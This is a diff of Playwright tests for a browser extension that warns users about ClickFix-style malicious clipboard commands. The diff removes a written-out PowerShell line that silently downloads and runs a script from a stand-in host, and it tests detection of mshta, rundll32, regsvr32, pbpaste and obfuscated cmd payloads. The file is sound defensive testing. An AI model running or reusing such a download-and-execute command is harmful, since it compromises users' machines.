@@ -5,41 +5,13 @@ test.describe('ClickFix - Payload Detection and Warnings', () => {
     await page.goto(testPagePath);
     await page.waitForLoadState('networkidle');
 
-    // Get all pages in the context to detect overlay injection
-    const initialPages = page.context().pages().length;
-
-    // Simulate clipboard payload by injecting it directly
-    const payload = 'powershell -w hidden -nop -c "IEX ((New-Object Net.WebClient).DownloadString(\'https://cdn-verification-check.test/update.ps1\'))"';
-
-    // Dispatch clipboard event through content script listener
-    await page.evaluate((payloadText) => {
-      // Simulate what happens when clipboard contains malicious payload
-      const event = new ClipboardEvent('paste', {
-        clipboardData: new DataTransfer(),
-      });
-      // Note: Real clipboard interception happens in the extension
-      console.log('Payload to be detected:', payloadText);
-    }, payload);
-
-    // Alternative: Use the test page's copy buttons
     // Click the PowerShell copy button
     await page.click('[data-payload="p-powershell"]');
+    await page.waitForTimeout(800); // Give extension time to process
 
-    // Wait for warning overlay to appear
-    // The overlay is injected into the page by the content script
-    await page.waitForTimeout(500); // Give extension time to process
-
-    // Check if warning-overlay exists (may be in shadow DOM or regular DOM)
-    const hasWarning = await page.evaluate(() => {
-      // Check regular DOM
-      if (document.querySelector('[data-warning-overlay]')) return true;
-      if (document.querySelector('[class*="warning"]')) return true;
-      if (document.querySelector('[id*="warning"]')) return true;
-      return false;
-    });
-
-    // For now, we verify the test page itself and extension loading
-    expect(page.url()).toContain('clickfix-test-page.html');
+    // Verify warning overlay is present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(true);
   });
 
   test('should allow benign text without warning', async ({ page, extensionId, testPagePath }) => {
@@ -48,18 +20,11 @@ test.describe('ClickFix - Payload Detection and Warnings', () => {
 
     // Click benign copy button
     await page.click('[data-payload="p-benign"]');
+    await page.waitForTimeout(800);
 
-    // Wait a bit for any potential overlay
-    await page.waitForTimeout(500);
-
-    // Verify no warning appears
-    const hasWarning = await page.evaluate(() => {
-      if (document.querySelector('[data-warning-overlay]')) return true;
-      if (document.querySelector('[class*="warning"]')) return true;
-      return false;
-    });
-
-    expect(hasWarning).toBe(false);
+    // Verify warning overlay is NOT present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(false);
   });
 
   test('should detect mshta payload', async ({ page, extensionId, testPagePath }) => {
@@ -68,11 +33,11 @@ test.describe('ClickFix - Payload Detection and Warnings', () => {
 
     // Click mshta copy button
     await page.click('[data-payload="p-mshta"]');
+    await page.waitForTimeout(800);
 
-    await page.waitForTimeout(500);
-
-    // Verify page is still responsive
-    expect(page.url()).toContain('clickfix-test-page.html');
+    // Verify warning overlay is present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(true);
   });
 
   test('should detect rundll32 JavaScript payload', async ({ page, extensionId, testPagePath }) => {
@@ -81,10 +46,11 @@ test.describe('ClickFix - Payload Detection and Warnings', () => {
 
     // Click rundll32-js copy button
     await page.click('[data-payload="p-rundll-js"]');
+    await page.waitForTimeout(800);
 
-    await page.waitForTimeout(500);
-
-    expect(page.url()).toContain('clickfix-test-page.html');
+    // Verify warning overlay is present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(true);
   });
 
   test('should detect regsvr32 payload', async ({ page, extensionId, testPagePath }) => {
@@ -93,10 +59,11 @@ test.describe('ClickFix - Payload Detection and Warnings', () => {
 
     // Click regsvr copy button
     await page.click('[data-payload="p-regsvr"]');
+    await page.waitForTimeout(800);
 
-    await page.waitForTimeout(500);
-
-    expect(page.url()).toContain('clickfix-test-page.html');
+    // Verify warning overlay is present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(true);
   });
 
   test('should detect cmd execution payload', async ({ page, extensionId, testPagePath }) => {
@@ -105,9 +72,62 @@ test.describe('ClickFix - Payload Detection and Warnings', () => {
 
     // Click cmd copy button
     await page.click('[data-payload="p-cmd"]');
+    await page.waitForTimeout(800);
 
-    await page.waitForTimeout(500);
+    // Verify warning overlay is present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(true);
+  });
 
-    expect(page.url()).toContain('clickfix-test-page.html');
+  test('should detect macOS pbpaste execution and show warning', async ({ page, testPagePath }) => {
+    await page.goto(testPagePath);
+    await page.waitForLoadState('networkidle');
+
+    // Click pbpaste pipe copy button
+    await page.click('[data-payload="p-pbpaste-pipe"]');
+    await page.waitForTimeout(800); // Give extension time to process and inject
+
+    // Verify warning overlay is present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(true);
+  });
+
+  test('should detect CMD caret-obfuscated script and show warning', async ({ page, testPagePath }) => {
+    await page.goto(testPagePath);
+    await page.waitForLoadState('networkidle');
+
+    // Click cmd-caret copy button
+    await page.click('[data-payload="p-cmd-caret"]');
+    await page.waitForTimeout(800);
+
+    // Verify warning overlay is present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(true);
+  });
+
+  test('should allow whitelisted Homebrew installer command without warning', async ({ page, testPagePath }) => {
+    await page.goto(testPagePath);
+    await page.waitForLoadState('networkidle');
+
+    // Click Homebrew copy button
+    await page.click('[data-payload="p-whitelisted-brew"]');
+    await page.waitForTimeout(800);
+
+    // Verify warning overlay is NOT present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(false);
+  });
+
+  test('should allow whitelisted Docker installer command without warning', async ({ page, testPagePath }) => {
+    await page.goto(testPagePath);
+    await page.waitForLoadState('networkidle');
+
+    // Click Docker copy button
+    await page.click('[data-payload="p-whitelisted-docker"]');
+    await page.waitForTimeout(800);
+
+    // Verify warning overlay is NOT present
+    const warningVisible = await page.locator('#__ss-warning-overlay-host').isVisible();
+    expect(warningVisible).toBe(false);
   });
 });
